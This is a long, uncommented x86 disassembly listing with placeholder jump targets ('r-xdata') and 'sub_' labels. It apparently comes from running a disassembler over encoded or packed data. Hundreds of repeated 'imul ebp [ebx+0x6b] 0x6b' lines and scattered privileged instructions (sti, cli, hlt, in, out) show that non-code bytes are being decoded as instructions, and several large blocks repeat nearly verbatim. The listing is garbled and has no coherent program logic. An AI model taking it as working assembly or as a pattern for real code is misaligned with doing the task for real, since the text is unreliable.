imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul edx [ ebx ] 0xffffffc6
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x13 ] 0xffffffc6
adc cl [ eax ]
add al [ esp + eax ]
imul ebp [ ebx + 0x6b ] 0x32
cmp [ ebx + 0x6b ] ch
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffffc8
cmp edi [ ebx + 0x6b6b3832 ]
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ edx ] 0x38
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x78
sahf
pop es
sti
jbe r-xdata
cli
adc bh [ edx + 0x6b040423 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
xor bh [ eax ]
enter 0x7832 0x3
add al 0xf4
outsb
cmp dh [ eax + 0x2 ]
js r-xdata
pop es
stosb [ edi ]
stosd [ edi ]
xchg ecx eax
stc
adc cl [ ebp + 0xd ]
add al 0x4
imul ebp [ ebx - 0x46 ] 0x71
0xf5ff4df4 0xb012
sub_4833eb
cmp [ ebx + 0x6b ] ch
imul ebp [ ebx + 0x6b ] 0x6b
enter 0xac04 0xac
xchg ecx eax
stc
lodsb [ esi ]
xchg ecx eax
stc
xchg ebx eax
sti
sti
sti
mov ebx 0x4f38e04
lodsd [ esi ]
retn
sub_4836f2
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul edx [ edx ] 0x2d
loopne r-xdata
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x4 ] 0x6d
jpo r-xdata
imul eax [ ebp * 2 - 0x4040485 ] 0x72
mov esi 0x8621203
sti
sti
jb r-xdata
mov edx 0x4df4ea71
push ebp
adc dh [ eax + 0x6b04040d ]
add al 0x8e
add al 0x4
imul ebx [ ebp + 0x70a1a672 ] 0x24
adc cl [ edx + esi * 8 - 0x5 ]
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xfffffff4
dec esp
0x12f93a78 0xf27f
add edx [ edx ]
bound ecx [ eax ]
sub_48375e
adc eax [ esi + 0x22 ]
add al 0x4
jle r-xdata
push ss
add al 0x4
imul ebp [ ebx + 0x6b ] 0xffffffa8
add al 0xac
stosd [ edi ]
adc al [ ecx ]
daa
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ eax + 0x23 ] 0x78
add [ esp + esi * 8 ] al
jle r-xdata
hlt
sti
sti
enter 0xbc04 0x7e
cmp esi esp
jle r-xdata
add eax [ esp + eax ]
enter 0x123b 0xdc
and al [ esp + eax ]
sti
sti
sti
adc eax esi
sbb eax 0x3b7e0404
hlt
sti
sti
sti
js r-xdata
xlat
stc
sti
sti
xchg ecx eax
shl [ ebx + 0x3a12a191 ] 0xf9
shl [ eax + 0x3 ] 0x9d
jb r-xdata
not [ edx ]
aas
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x70
pop ss
jpe r-xdata
cmp edx [ edx ]
fsub [ edx ]
add al 0x4
or esi [ eax + 0x2b ]
adc bl [ edi - 0x1c ]
sti
sti
imul ebp [ ebx + 0x70 ] 0x73
sti
cli
sti
sti
add al 0x8f
fucomip st7
jb r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ecx eax 0x3b
cmp [ ebx + 0x6b ] ch
imul ebp [ ebx + 0x6b ] 0x6b
jo r-xdata
fstp st3
jbe r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x4
mov es [ edi ]
and eax [ esi ]
add al 0x4
sar [ esi - 0xbd3ed0d ] 0xfb
sti
imul esp [ ecx - 0x3c518d63 ] 0x70
add eax 0x1586729d
jo r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul edx [ edx ] 0x59
push es
add al 0x4
imul ebp [ ebx + 0x6b ] 0x4
lodsd [ esi ]
retn
fistp [ ebx - 0x7 ]
sti
sti
stosb [ edi ]
stosd [ edi ]
jo r-xdata
test al 0xe2
sti
sti
js r-xdata
popfd
jb r-xdata
add al 0x8e
pop ds
adc ch [ eax ]
and eax [ esp + eax ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x4 ] 0xffffff8e
pop es
adc ebp [ eax + 0x78fbfbe2 ]
aas
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul eax [ esi + ecx * 4 ] 0x7
jmp r-xdata
sti
sti
imul esi esp 0x4c
cmp ebp [ ebx + 0x63133d70 ]
adc bh [ edx ]
stc
add [ esp + esi * 8 ] al
jle r-xdata
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x4 ] 0xffffff8e
or edx [ edx ]
sub al [ esp + eax ]
enter 0x123b 0x6d
or [ esp + eax ] eax
js r-xdata
xor al [ esp + eax ]
jbe r-xdata
stc
adc dl [ edx - 0x4 ]
sti
sti
add al 0x78
add ebp [ ebx + 0x4085612 ]
add al 0x9d
jb r-xdata
cmp bh cl
adc edx [ edx ]
pop ss
adc eax 0x6b6b0404
imul ebp [ ebx + 0x6b ] 0x6b
imul eax [ esi + ecx * 4 ] 0xb
adc bl bl
std
sti
sti
jb r-xdata
imul ebp [ ebx + 0x4 ] 0xffffffad
xlat
retn
das
add al 0x8e
sub_483815
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x60 ] 0x32
cmp [ ebx + 0x6b ] ch
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x38 ] 0x3b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x4
mov es [ edi ]
and eax [ esi ]
add al 0x4
sar [ esi - 0xbd3ed0d ] 0xfb
sti
imul esp [ ecx - 0x3c518d63 ] 0x70
add eax 0x1586729d
jo r-xdata
test al 0xe2
sti
sti
js r-xdata
popfd
jb r-xdata
add al 0x8e
pop ds
adc ch [ eax ]
and eax [ esp + eax ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul eax [ esi + ecx * 4 ] 0x7
jmp r-xdata
adc bh [ edx ]
stc
shl [ eax + 0x3 ] 0x9d
jb r-xdata
add [ esp + esi * 8 ] al
jle r-xdata
not [ edx ]
aas
cmp edx [ edx ]
fsub [ edx ]
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x70
pop ss
jpe r-xdata
or esi [ eax + 0x2b ]
adc bl [ edi - 0x1c ]
sti
sti
imul ebp [ ebx + 0x70 ] 0x73
sti
cli
sti
sti
add al 0x8f
fucomip st7
jb r-xdata
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x4 ] 0xffffff8e
or edx [ edx ]
sub al [ esp + eax ]
enter 0x123b 0x6d
or [ esp + eax ] eax
js r-xdata
sti
sti
sti
js r-xdata
sti
sti
imul esi esp 0x4c
cmp ebp [ ebx + 0x63133d70 ]
xlat
stc
sti
sti
xchg ecx eax
shl [ ebx + 0x3a12a191 ] 0xf9
cmp [ ebx + 0x6b ] ch
imul ebp [ ebx + 0x6b ] 0x6b
jo r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ecx eax 0x3b
fstp st3
jbe r-xdata
xor al [ esp + eax ]
jbe r-xdata
stc
imul ebp [ ebx + 0x6b ] 0x6b
imul edx [ edx ] 0x59
push es
add al 0x4
imul ebp [ ebx + 0x6b ] 0x4
lodsd [ esi ]
retn
fistp [ ebx - 0x7 ]
sti
sti
stosb [ edi ]
stosd [ edi ]
jo r-xdata
adc dl [ edx - 0x4 ]
sti
sti
add al 0x78
add ebp [ ebx + 0x4085612 ]
add al 0x9d
jb r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x4 ] 0xffffff8e
pop es
adc ebp [ eax + 0x78fbfbe2 ]
aas
cmp bh cl
adc edx [ edx ]
pop ss
adc eax 0x6b6b0404
imul ebp [ ebx + 0x6b ] 0x6b
imul eax [ esi + ecx * 4 ] 0xb
adc bl bl
std
sti
sti
jb r-xdata
imul ebp [ ebx + 0x4 ] 0xffffffad
xlat
retn
das
add al 0x8e
sub_483984
adc dh [ eax + 0x6b040432 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul edx [ edx ] 0xffffff9d
loopne r-xdata
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffffc0
scasd [ edi ]
[ edi ]
hlt
sub_483ab3
dec esp
leave
popfd
jle r-xdata
jb r-xdata
hlt
pop es
js r-xdata
daa
mov [ 0x729d9491 ] eax
mov esi 0x17ad1225
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
scasb [ edi ]
sti
imul ebx [ ebp - 0x5cd8418e ] 0xffffff91
xchg esp eax
popfd
jb r-xdata
out dx eax
adc ah [ eax + 0x6bfbfbf4 ]
jbe r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x4 ] 0x4d
js r-xdata
sti
sti
imul esi [ esi - 0x42 ] 0x1b
adc cl cl
jo r-xdata
and eax 0x417ad12
add al 0x6b
sti
imul ebp [ ebx + 0x6b ] 0xffffff9d
jb r-xdata
std
sti
sti
stosb [ edi ]
stosb [ edi ]
adc dl [ ecx + 0x6b04041f ]
imul ebp [ ebx - 0xc ] 0x7e
or ah dh
sti
sti
jo r-xdata
sbb edx [ edx ]
leave
js r-xdata
adc ebp [ ebp + 0x78040423 ]
aas
aas
sti
sti
sti
jo r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
add al 0x4d
fld [ eax + 0x5912acad ]
cmp eax 0x6b6b0404
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffffae
popfd
jle r-xdata
mov esi 0x32901217
add al 0x4
imul ebx [ ebp - 0x5cea418e ] 0xffffff91
mov esi [ esi - 0x42 ]
out dx eax
popfd
jb r-xdata
imul esi esp 0x7f
test esi 0xfbfb119b
adc cl ch
push ds
add al 0x4
imul ebp [ ebx - 0x5f ] 0x12
and al 0x32
add al 0x4
movsb [ edi ] [ esi ]
xchg ecx eax
sahf
popfd
jb r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
and eax 0x729d3c70
mov esi 0x8391a31b
jo r-xdata
jg r-xdata
hlt
sub al [ esp + eax ]
or [ ebx - 0x625a776f ] esp
jb r-xdata
adc bl [ edx ]
xchg ebx eax
jo r-xdata
sti
jmp r-xdata
add al 0x93
xchg ecx eax
pushfd
jo r-xdata
popfd
jb r-xdata
xchg edi eax
enter 0x1320 0xc2
and [ esp + eax ] al
adc dh [ edx + 0x6b040420 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x70 ] 0xffffffb6
in eax 0xfb
sti
adc bl [ edx ]
int1
sti
imul ebp [ ebx + 0x6b ] 0xffffffae
jo r-xdata
mov [ 0x3832230c ] al
imul ebp [ ebx + 0x6b ] 0xffffff9d
jb r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
popfd
jb r-xdata
setno [ edi + 0x729d3d70 ]
mov esi 0x3c3d120d
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebx [ ebp + 0x1303b672 ] 0x5d
add al 0x4
xchg [ ebx + 0x729d3d70 ] ebp
scasb [ edi ]
add al 0x8e
aaa
add al 0x4
adc cl [ esi + 0x6b04042c ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0xc ] 0x7f
sbb [ ebp + 0x729d2570 ] esp
cmpsb [ esi ] [ edi ]
jo r-xdata
adc dh [ eax - 0xa ]
sti
sti
pop ss
adc dl [ eax + 0x6b040432 ]
popfd
jb r-xdata
adc al 0x4
add al 0x12
mov cl 0x14
add al 0x4
and [ esp + eax ] al
or al 0x23
loopne r-xdata
add edx [ ebx ]
pop ebp
sahf
mov al [ 0xbbe729d ]
xchg ecx eax
mov [ eax + 0x38 ] esi
popfd
xchg ecx eax
adc dl al
loopne r-xdata
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x70 ] 0x24
popfd
jb r-xdata
hlt
popfd
jb r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
fistp [ ebx - 0x62056e5d ]
jb r-xdata
mov edi 0x91a3bbdf
cli
popfd
adc eax 0xa09e91a3
popfd
jb r-xdata
imul ebp [ ebx - 0x43 ] 0x7e
sub esp esi
jle r-xdata
sti
sti
sti
clc
mov gs di
mov edx 0x12f7b6c0
mov [ 0xb708391 ] eax
add esp [ eax + 0x1a6729d ]
xchg ecx eax
cwde
jo r-xdata
xchg ecx eax
popfd
jb r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x40 ] 0xffffffaf
[ edi ]
hlt
fistp [ ecx + 0x12ab3bc8 ]
sbb ch [ edx ]
mov edi 0x3bc8b9df
stosd [ edi ]
jb r-xdata
or edx [ ecx - 0x62c78f77 ]
cld
loopne r-xdata
not [ edx ]
sti
imul ebp [ ebx + 0x6b ] 0xffffffa3
xchg ecx eax
xchg ebp eax
popfd
jb r-xdata
sub [ eax + 0x3a ] esi
popfd
jb r-xdata
xchg edi ebx
jmp r-xdata
jb r-xdata
pop es
adc dh [ esi - 0x11 ]
sti
sti
imul eax [ esi + ecx * 4 ] 0x1f
add al 0xac
cmpsd [ esi ] [ edi ]
js r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
add al 0xbf
fucomip st3
js r-xdata
add al 0x4
pop ds
popfd
jb r-xdata
pop es
cli
adc bh [ edx ]
adc eax [ esp + eax ]
imul ebp [ ebx + 0x6b ] 0x6b
jae r-xdata
xchg ebx eax
fucomip st3
out dx eax
hlt
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
sbb esp [ ebx + 0xb708391 ]
or al 0x8e
jmp r-xdata
inc edx
enter 0x7029 0x3a
retn 0x29c8
sub_483b59
sti
adc dl ch
clc
sti
sti
jbe r-xdata
movsb [ edi ] [ esi ]
movsd [ edi ] [ esi ]
adc ah [ ecx - 0x16 ]
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ esi - 0x6e53e890 ] 0xffffffff
xchg ebx eax
sti

cmpsd [ esi ] [ edi ]
push es
add al 0x4
stosd [ edi ]
adc dl al
loopne r-xdata
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x70 ] 0x24
popfd
jb r-xdata
mov [ 0xb708391 ] eax
add esp [ eax + 0x1a6729d ]
xchg ecx eax
cwde
jo r-xdata
jb r-xdata
sbb [ ebp + 0x729d2570 ] esp
cmpsb [ esi ] [ edi ]
sub [ eax + 0x3a ] esi
popfd
jb r-xdata
pop es
js r-xdata
daa
mov [ 0x729d9491 ] eax
mov esi 0x17ad1225
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
scasb [ edi ]
add al 0x8e
adc cl [ esi + 0x6b04042c ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0xc ] 0x7f
xchg edi ebx
jmp r-xdata
jb r-xdata
pop es
adc dh [ esi - 0x11 ]
sti
sti
imul eax [ esi + ecx * 4 ] 0x1f
add al 0xac
cmpsd [ esi ] [ edi ]
js r-xdata
sti
imul ebx [ ebp - 0x5cd8418e ] 0xffffff91
xchg esp eax
popfd
jb r-xdata
out dx eax
adc ah [ eax + 0x6bfbfbf4 ]
jbe r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x4 ] 0x4d
js r-xdata
sti
jmp r-xdata
add al 0x93
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
add al 0xbf
fucomip st3
js r-xdata
add al 0x4
pop ds
popfd
jb r-xdata
pop es
cli
adc bh [ edx ]
adc eax [ esp + eax ]
imul ebp [ ebx + 0x6b ] 0x6b
jae r-xdata
sti
sti
imul esi [ esi - 0x42 ] 0x1b
adc cl cl
jo r-xdata
and eax 0x417ad12
add al 0x6b
sti
imul ebp [ ebx + 0x6b ] 0xffffff9d
jb r-xdata
std
sti
sti
stosb [ edi ]
stosb [ edi ]
adc dl [ ecx + 0x6b04041f ]
imul ebp [ ebx - 0xc ] 0x7e
or ah dh
sti
sti
jo r-xdata
sbb edx [ edx ]
leave
js r-xdata
adc ebp [ ebp + 0x78040423 ]
aas
aas
sti
sti
sti
jo r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
add al 0x4d
fld [ eax + 0x5912acad ]
cmp eax 0x6b6b0404
imul ebp [ ebx + 0x6b ] 0x6b
xchg ebx eax
fucomip st3
out dx eax
hlt
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
popfd
jb r-xdata
sbb esp [ ebx + 0xb708391 ]
or al 0x8e
jmp r-xdata
inc edx
enter 0x7029 0x3a
retn 0x29c8
imul ebp [ ebx + 0x6b ] 0xffffffae
popfd
jle r-xdata
mov esi 0x32901217
add al 0x4
imul ebx [ ebp - 0x5cea418e ] 0xffffff91
mov esi [ esi - 0x42 ]
out dx eax
popfd
jb r-xdata
aaa
add al 0x4
imul esi esp 0x7f
test esi 0xfbfb119b
adc cl ch
push ds
add al 0x4
imul ebp [ ebx - 0x5f ] 0x12
and al 0x32
add al 0x4
movsb [ edi ] [ esi ]
xchg ecx eax
sahf
popfd
jb r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
and eax 0x729d3c70
mov esi 0x8391a31b
jo r-xdata
jg r-xdata
hlt
sub al [ esp + eax ]
or [ ebx - 0x625a776f ] esp
jb r-xdata
adc bl [ edx ]
xchg ebx eax
jo r-xdata
xchg ecx eax
pushfd
jo r-xdata
xchg edi eax
enter 0x1320 0xc2
and [ esp + eax ] al
adc dh [ edx + 0x6b040420 ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x70 ] 0xffffffb6
in eax 0xfb
sti
adc bl [ edx ]
int1
sti
imul ebp [ ebx + 0x6b ] 0xffffffae
jo r-xdata
mov [ 0x3832230c ] al
imul ebp [ ebx + 0x6b ] 0xffffff9d
jb r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
popfd
jb r-xdata
setno [ edi + 0x729d3d70 ]
mov esi 0x3c3d120d
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebx [ ebp + 0x1303b672 ] 0x5d
add al 0x4
xchg [ ebx + 0x729d3d70 ] ebp
scasb [ edi ]
jo r-xdata
adc dh [ eax - 0xa ]
sti
sti
pop ss
adc dl [ eax + 0x6b040432 ]
popfd
jb r-xdata
adc al 0x4
add al 0x12
mov cl 0x14
add al 0x4
and [ esp + eax ] al
or al 0x23
loopne r-xdata
add edx [ ebx ]
pop ebp
sahf
mov al [ 0xbbe729d ]
xchg ecx eax
mov [ eax + 0x38 ] esi
popfd
xchg ecx eax
hlt
popfd
jb r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
fistp [ ebx - 0x62056e5d ]
jb r-xdata
mov edi 0x91a3bbdf
cli
popfd
adc eax 0xa09e91a3
popfd
jb r-xdata
imul ebp [ ebx - 0x43 ] 0x7e
sub esp esi
jle r-xdata
sti
sti
sti
clc
mov gs di
mov edx 0x12f7b6c0
xchg ecx eax
popfd
jb r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x40 ] 0xffffffaf
[ edi ]
hlt
fistp [ ecx + 0x12ab3bc8 ]
sbb ch [ edx ]
mov edi 0x3bc8b9df
stosd [ edi ]
jb r-xdata
or edx [ ecx - 0x62c78f77 ]
cld
loopne r-xdata
not [ edx ]
sti
imul ebp [ ebx + 0x6b ] 0xffffffa3
xchg ecx eax
xchg ebp eax
popfd
jb r-xdata
sub_483c3c
out dx al
sti
sti
jbe r-xdata
adc ah [ edx + 0x6b040434 ]
imul ebp [ ebx - 0x63 ] 0xffffffc0
or [ edx ] dl
imul eax [ 0x6b6b0404 ] 0xbe729d6b
adc ebp [ ebx - 0x1979ed53 ]
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
jo r-xdata
out dx eax
hlt
pop ebx
popfd
jb r-xdata
xor eax 0x4136a12
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0xffffff9d
jb r-xdata
xor bh [ eax ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul esi [ esi - 0x44 ] 0xfffffffa
stosd [ edi ]
hlt
sti
sti
sti
movsb [ edi ] [ esi ]
movsd [ edi ] [ esi ]
adc ah [ ecx - 0x16 ]
sti
sti
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ esi - 0x6e53e890 ] 0xffffffff
xchg ebx eax
sti

pop edi
adc ecx [ ebp + 0x26 ]
add al 0x4
mov [ 0x3b7ea4a2 ] al
hlt
sub_484bf5
push es
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul esp [ ebp + 0x6b3832a0 ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x5b ] 0x70
cmp al 0xa4
jo r-xdata
inc ebx
sti
sti
sti
adc edi [ ecx + eax + 0x4 ]
add al 0x93
pop eax
salc
sbb ah ah
lodsb [ esi ]
jb r-xdata
jbe r-xdata
pop edi
sti
xor bh [ eax ]
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
movsd [ edi ] [ esi ]
jo r-xdata
rcl [ ebx ] cl
add [ ecx ] 0x4
add al 0x12
push esi
and [ esp + eax ] al
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + edx + 0x40401a6 ] 0xffffffa2
mov [ 0x431a512 ] al
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
clc
jge r-xdata
lodsb [ esi ]
jb r-xdata
sbb ebp [ ebx + 0x42c2112 ]
add al 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
jo r-xdata
sti
[ edi ]
adc ch [ esi + 0x6bfbfbfe ]
lodsb [ esi ]
jb r-xdata
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx - 0x54 ] 0x13
cmpsb [ esi ] [ edi ]
add [ esp + eax ] eax
mov [ 0x31a512a2 ] al
add al 0x4
imul ebp [ ebx + 0x6b ] 0x6b
imul ebp [ ebx + 0x6b ] 0x6b
imul edi eax 0x7d
cmp edi ebx
cmpsb [ esi ] [ edi ]
cmp [ ebx + 0x6b ] ch
imul ebp [ ebx - 0x6d ] 0xffffffb4
add [ ebp - 0x428d530a ] al
xlat
adc esp [ ebx + 0x1 ]
add al 0x4
xchg ebx eax
sbb eax esi
